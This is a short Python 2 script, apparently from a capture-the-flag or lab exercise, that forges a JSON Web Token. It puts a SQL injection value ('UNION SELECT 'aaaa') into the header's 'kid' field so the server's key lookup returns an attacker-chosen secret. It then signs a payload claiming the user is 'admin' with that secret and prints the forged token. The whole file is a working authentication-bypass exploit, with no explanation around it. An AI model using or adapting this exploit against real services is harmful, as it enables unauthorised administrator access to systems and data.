import hmac
import hashlib
import base64
import json

header = {"typ":"JWT","alg":"HS256","kid":"bbbbbbbbb'UNION SELECT 'aaaa"}

payload = {"user":"admin"}
key = "aaaa"
 

str = base64.urlsafe_b64encode(json.dumps(header)).rstrip("=")+"."+base64.urlsafe_b64encode(json.dumps(payload)).rstrip("=")

signature= base64.urlsafe_b64encode(hmac.new(key,str,hashlib.sha256).digest()).decode('utf8').rstrip("=")

print str+"."+signature